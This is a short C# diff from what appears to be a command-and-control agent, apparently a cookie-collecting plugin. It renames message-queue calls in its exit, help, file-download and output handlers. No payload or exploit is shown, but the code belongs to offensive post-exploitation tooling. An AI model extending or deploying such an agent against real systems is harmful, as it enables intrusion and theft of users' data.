@@ -71,7 +71,7 @@ namespace Agent
                 },
             };
 
-            await this.messageManager.AddResponse(dr.ToJson());
+            this.messageManager.AddTaskResponse(dr.ToJson());
 
             this.cookiesOut.Remove(response.task_id);
         }
@@ -133,7 +133,7 @@ namespace Agent
                     break;
                 case "exit":
                     this.config = new CursedConfig();
-                    await this.messageManager.AddResponse(new InteractMessage()
+                    this.messageManager.AddInteractMessage(new InteractMessage()
                     {
                         task_id = message.task_id,
                         data = Misc.Base64Encode("Exited."),
@@ -141,7 +141,7 @@ namespace Agent
                     });
                     break;
                 case "help":
-                    await this.messageManager.AddResponse(new InteractMessage()
+                    this.messageManager.AddInteractMessage(new InteractMessage()
                     {
                         task_id = message.task_id,
                         data = Misc.Base64Encode(CommandParser.GetHelpText() + Environment.NewLine),
@@ -421,7 +421,7 @@ namespace Agent
         } 
         private void StartSendFile(string task_id)
         {
-            messageManager.AddResponse(new DownloadTaskResponse
+            messageManager.AddTaskResponse(new DownloadTaskResponse
             {
                 download = new DownloadTaskResponseData()
                 {
@@ -436,7 +436,7 @@ namespace Agent
         }
         private void ReturnOutput(string message, string task_id)
         {
-            this.messageManager.AddResponse(new InteractMessage()
+            this.messageManager.AddInteractMessage(new InteractMessage()
             {
                 task_id = task_id,
                 data = Misc.Base64Encode(message + Environment.NewLine),
